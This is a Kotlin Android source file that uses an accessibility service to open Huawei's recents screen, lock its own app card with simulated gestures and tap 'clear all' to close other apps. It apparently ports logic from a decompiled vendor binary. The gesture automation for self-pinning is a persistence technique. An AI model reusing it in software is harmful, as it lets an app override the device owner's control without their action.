package com.storm.safe.rock.service.modules.yw5xud.huawei

import android.graphics.Path
import android.graphics.Rect
import android.view.accessibility.AccessibilityNodeInfo
import com.storm.safe.rock.auto.a11y.UiAutomation
import com.storm.safe.rock.service.MyAccessibilityService
import com.storm.safe.rock.service.modules.yw5xud.HuaweiSteps
import com.storm.safe.rock.service.modules.yw5xud.common.AppCardMatcher
import kotlinx.coroutines.delay

/**
 * Step 9/10 -- Clear Recent Tasks (vendor m212167b4, L2741-2915).
 *
 * Locks the app card in the recents screen, then clicks the "clear all" button
 * to remove other apps from recents while keeping ours pinned.
 */
class HuaweiStep9ClearTasks(
    private val service: MyAccessibilityService?,
    private val ui: UiAutomation,
    private val steps: HuaweiSteps
) {
    companion object {
        private const val TAG = "HuaweiStep9ClearTasks"
    }

    @Suppress("UNUSED_PARAMETER")
    suspend fun execute(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        android.util.Log.i(TAG, "[Step9/10] enter executeStep9ClearRecentTasks")
        HuaweiStepLogger.phase(9, "清除最近任务开始", "vendor m212167b4 L2761", logs)
        try {
            val locked = tryLockAppInRecents()
            if (locked) {
                delay(100L)
                val cleared = findAndClickClearAllButton(logs)
                if (cleared) {
                    logs.add("[Step9/10] 清除按钮点击成功 (vendor L2862)")
                    delay(100L)
                } else {
                    logs.add("[Step9/10] 未找到清除按钮 (vendor L2873)")
                }
                logs.add("[Step9/10] 返回桌面 (vendor L2867)")
                performGlobalActionHome()
            } else {
                logs.add("[Step9/10] 锁定失败，跳过清除 (vendor L2910)")
                logs.add("[Step9/10] 返回桌面 (vendor L2912)")
                performGlobalActionHome()
            }
            logs.add("[Step9/10] 清除最近任务 — 完成 (vendor L2884)")
            successes.add("[Step9/10] 最近任务处理完成")
        } catch (e: kotlinx.coroutines.CancellationException) {
            throw e
        } catch (e: Exception) {
            failures.add("[Step9/10] 异常: ${e.message}")
            logs.add("[Step9/10] 异常，尝试返回桌面")
            try { performGlobalActionHome() } catch (_: Exception) {}
        }
    }

    // ---- lock flow ----

    private suspend fun tryLockAppInRecents(): Boolean {
        val svc = service ?: return false
        return try {
            android.util.Log.d(TAG, "[锁定流程] 1. 返回APP前台")
            val launchIntent = steps.ctx.packageManager
                ?.getLaunchIntentForPackage(steps.ctx.packageName)
                ?.apply { addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK) }
            if (launchIntent != null) {
                steps.ctx.startActivity(launchIntent)
            } else {
                android.util.Log.w(TAG, "[锁定流程] 无可用的启动 Activity，跳过返回前台")
            }
            delay(100L)

            android.util.Log.d(TAG, "[锁定流程] 2. 打开最近任务列表")
            svc.performGlobalAction(3)
            delay(300L)

            val root = svc.rootInActiveWindow
            if (root != null) {
                val pkgName = root.packageName?.toString() ?: ""
                val isRecents = pkgName == "com.huawei.android.launcher" ||
                    pkgName == "com.hihonor.android.launcher" ||
                    pkgName.contains("launcher", ignoreCase = true) ||
                    pkgName.contains("recents", ignoreCase = true)
                val hasRecentsText = if (!isRecents) {
                    HuaweiSteps.RECENTS_VERIFY_KEYWORDS.any { kw ->
                        val nodes = root.findAccessibilityNodeInfosByText(kw)
                        nodes != null && nodes.any { it.isVisibleToUser }
                    }
                } else false
                root.recycle()
                if (!isRecents && !hasRecentsText) {
                    android.util.Log.w(TAG, "[锁定流程] 未能打开最近任务列表")
                    return false
                }
            }
            android.util.Log.d(TAG, "[锁定流程] 最近任务列表已打开")
            delay(300L)

            android.util.Log.d(TAG, "[锁定流程] 3. 横向滑动激活任务列表")
            performHorizontalSwipe()
            delay(400L)

            android.util.Log.d(TAG, "[锁定流程] 4. 查找APP卡片...")
            val cardRect = findAppCardRect()
            if (cardRect == null) {
                android.util.Log.w(TAG, "[锁定流程] 未找到APP卡片")
                return false
            }
            android.util.Log.d(TAG, "[锁定流程] 找到APP卡片: $cardRect")

            val lockState = verifyLockState()
            if (lockState == HuaweiSteps.LockVerifyResult.Locked) {
                android.util.Log.d(TAG, "[锁定流程] APP已经是锁定状态，无需操作")
                return true
            }

            android.util.Log.d(TAG, "[锁定流程] 在APP位置执行下滑锁定...")
            val height = steps.getScreenHeightPx().toFloat()
            val fromY = height * 0.3f
            val toY = height * 0.65f
            val swipeOk = performSwipeDownGesture(cardRect.centerX().toFloat(), fromY, toY)
            if (!swipeOk) {
                android.util.Log.w(TAG, "[锁定流程] 下滑手势执行失败")
                return false
            }

            val finalState = verifyLockState()
            when (finalState) {
                HuaweiSteps.LockVerifyResult.Locked -> {
                    android.util.Log.d(TAG, "[锁定流程] 验证通过：APP已锁定")
                    true
                }
                HuaweiSteps.LockVerifyResult.Unlocked -> {
                    android.util.Log.w(TAG, "[锁定流程] 验证失败：仍未锁定")
                    false
                }
                HuaweiSteps.LockVerifyResult.Unknown -> {
                    android.util.Log.w(TAG, "[锁定流程] 无法验证锁定状态，假设成功")
                    true
                }
            }
        } catch (e: kotlinx.coroutines.CancellationException) {
            throw e
        } catch (e: Exception) {
            android.util.Log.w(TAG, "[锁定流程] 异常: ${e.message}")
            false
        }
    }

    private fun verifyLockState(): HuaweiSteps.LockVerifyResult {
        val svc = service ?: return HuaweiSteps.LockVerifyResult.Unknown
        val root = try { svc.rootInActiveWindow } catch (_: Exception) { null }
            ?: return HuaweiSteps.LockVerifyResult.Unknown
        return try {
            for (unlockKw in HuaweiSteps.LOCK_INDICATOR_TEXTS) {
                val nodes = root.findAccessibilityNodeInfosByText(unlockKw) ?: continue
                for (node in nodes) {
                    if (node.isVisibleToUser) {
                        val txt = node.text?.toString() ?: ""
                        val cd = node.contentDescription?.toString() ?: ""
                        if ((txt == unlockKw || cd == unlockKw) &&
                            !txt.contains("已") && !txt.contains("解") &&
                            !cd.contains("已") && !cd.contains("解")) {
                            android.util.Log.d(TAG, "[锁定验证] 找到'$unlockKw'按钮 -> 已锁定")
                            return HuaweiSteps.LockVerifyResult.Locked
                        }
                    }
                }
            }
            val lockKws = listOf("锁定", "鎖定", "加锁", "Lock", "LOCK", "잠금", "잠그기", "Sperren", "Verrouiller")
            for (lockKw in lockKws) {
                val nodes = root.findAccessibilityNodeInfosByText(lockKw) ?: continue
                for (node in nodes) {
                    if (node.isVisibleToUser) {
                        val txt = node.text?.toString() ?: ""
                        val cd = node.contentDescription?.toString() ?: ""
                        if ((txt == lockKw || cd == lockKw) &&
                            !txt.contains("已") && !txt.contains("解") &&
                            !cd.contains("已") && !cd.contains("解")) {
                            android.util.Log.d(TAG, "[锁定验证] 找到'$lockKw'按钮 -> 未锁定")
                            return HuaweiSteps.LockVerifyResult.Unlocked
                        }
                    }
                }
            }
            for (viewId in HuaweiSteps.LOCK_ICON_VIEW_IDS) {
                val nodes = root.findAccessibilityNodeInfosByViewId(viewId)
                if (nodes != null && nodes.isNotEmpty() && nodes.any { it.isVisibleToUser }) {
                    android.util.Log.d(TAG, "[锁定验证] 找到锁定图标: $viewId -> 已锁定")
                    return HuaweiSteps.LockVerifyResult.Locked
                }
            }
            android.util.Log.d(TAG, "[锁定验证] 无法确认锁定状态")
            HuaweiSteps.LockVerifyResult.Unknown
        } finally {
            try { root.recycle() } catch (_: Exception) {}
        }
    }

    private fun findAndClickClearAllButton(logs: MutableList<String>): Boolean {
        val svc = service ?: return false
        val root = try {
            svc.windows?.firstOrNull { w ->
                val pkg = w.root?.packageName?.toString() ?: ""
                pkg.contains("launcher", ignoreCase = true) || pkg.contains("recents", ignoreCase = true)
            }?.root ?: svc.rootInActiveWindow
        } catch (_: Exception) {
            try { svc.rootInActiveWindow } catch (_: Exception) { null }
        } ?: return false
        return try {
            // Tier 1: viewId
            for (viewId in HuaweiSteps.CLEAR_ALL_RECENTS_VIEW_IDS) {
                val nodes = root.findAccessibilityNodeInfosByViewId(viewId)
                if (nodes != null && nodes.isNotEmpty()) {
                    for (node in nodes) {
                        if (node.isVisibleToUser) {
                            if (node.isClickable && node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                                logs.add("[Step9/10] resource-id点击成功: $viewId")
                                return true
                            }
                            val rect = Rect()
                            node.getBoundsInScreen(rect)
                            if (!rect.isEmpty) {
                                gestureTapFast(rect.centerX().toFloat(), rect.centerY().toFloat())
                                logs.add("[Step9/10] 坐标点击成功: $viewId")
                                return true
                            }
                        }
                    }
                }
            }

            // Tier 2: contentDescription
            for (cd in HuaweiSteps.CLEAR_ALL_CONTENT_DESCS) {
                val node = findNodeByContentDesc(root, cd)
                if (node != null && node.isVisibleToUser) {
                    if (node.isClickable && node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                        logs.add("[Step9/10] contentDescription点击成功: $cd")
                        return true
                    }
                    val rect = Rect()
                    node.getBoundsInScreen(rect)
                    if (!rect.isEmpty) {
                        gestureTapFast(rect.centerX().toFloat(), rect.centerY().toFloat())
                        logs.add("[Step9/10] contentDescription坐标点击成功: $cd")
                        return true
                    }
                }
            }

            // Tier 3: text
            for (kw in HuaweiSteps.CLEAR_ALL_TEXT_KEYWORDS.distinct()) {
                val nodes = root.findAccessibilityNodeInfosByText(kw) ?: continue
                for (node in nodes) {
                    if (!node.isVisibleToUser) continue
                    val txt = node.text?.toString() ?: ""
                    if (txt != kw && !txt.contains(kw, ignoreCase = true)) continue
                    if (node.isClickable && node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                        logs.add("[Step9/10] 文本点击成功: $kw")
                        return true
                    }
                    var parent = node.parent
                    var depth = 0
                    while (parent != null && depth < 3) {
                        if (parent.isClickable && parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                            logs.add("[Step9/10] 父节点点击成功: $kw")
                            return true
                        }
                        parent = parent.parent
                        depth++
                    }
                    val rect = Rect()
                    node.getBoundsInScreen(rect)
                    if (!rect.isEmpty) {
                        gestureTapFast(rect.centerX().toFloat(), rect.centerY().toFloat())
                        logs.add("[Step9/10] 坐标点击成功: $kw")
                        return true
                    }
                }
            }

            android.util.Log.d(TAG, "[清除任务] 未找到清除按钮")
            false
        } finally {
            try { root.recycle() } catch (_: Exception) {}
        }
    }

    private fun findAppCardRect(): Rect? {
        val svc = service ?: return null
        val root = try { svc.rootInActiveWindow } catch (_: Exception) { null } ?: return null
        val rect = AppCardMatcher.findCardRect(root, appLabel = steps.appLabel, packageName = steps.packageName)
        if (rect != null) {
            android.util.Log.d(TAG, "[查找APP卡片] 命中 ($rect)")
        } else {
            android.util.Log.w(TAG, "[查找APP卡片] 全部 3 种策略未命中 (appLabel=${steps.appLabel}, pkg=${steps.packageName})")
        }
        return rect
    }

    private fun performHorizontalSwipe() {
        val svc = service ?: return
        try {
            val fromX = steps.getScreenWidthPx() * 0.85f
            val toX = steps.getScreenWidthPx() * 0.15f
            val y = steps.getScreenHeightPx() * 0.45f
            android.util.Log.d(TAG, "[横向滑动] 华为: ($fromX, $y) -> ($toX, $y), 时长=400ms")
            val path = Path()
            path.moveTo(fromX, y)
            path.lineTo(toX, y)
            val gesture = android.accessibilityservice.GestureDescription.Builder()
                .addStroke(android.accessibilityservice.GestureDescription.StrokeDescription(path, 10L, 400L))
                .build()
            svc.dispatchGesture(gesture, null, null)
        } catch (e: Exception) {
            android.util.Log.w(TAG, "[横向滑动] 失败: ${e.message}")
        }
    }

    private fun performSwipeDownGesture(x: Float, fromY: Float, toY: Float): Boolean {
        val svc = service ?: return false
        return try {
            val path = Path()
            path.moveTo(x, fromY)
            path.lineTo(x, toY)
            val gesture = android.accessibilityservice.GestureDescription.Builder()
                .addStroke(android.accessibilityservice.GestureDescription.StrokeDescription(path, 10L, 500L))
                .build()
            val ok = svc.dispatchGesture(gesture, null, null)
            if (!ok) android.util.Log.w(TAG, "[下滑手势] dispatchGesture返回false")
            ok
        } catch (e: Exception) {
            android.util.Log.w(TAG, "[下滑手势] 失败: ${e.message}")
            false
        }
    }

    private fun performGlobalActionHome() {
        try {
            service?.performGlobalAction(2)
        } catch (_: Exception) {}
    }

    private fun gestureTapFast(x: Float, y: Float): Boolean {
        return HuaweiGestureHelper(service).gestureTapFast(x, y)
    }

    private fun findNodeByContentDesc(root: AccessibilityNodeInfo, desc: String): AccessibilityNodeInfo? {
        val cd = root.contentDescription?.toString() ?: ""
        if (cd == desc) return root
        for (i in 0 until root.childCount) {
            val child = root.getChild(i) ?: continue
            val found = findNodeByContentDesc(child, desc)
            if (found != null) return found
        }
        return null
    }
}
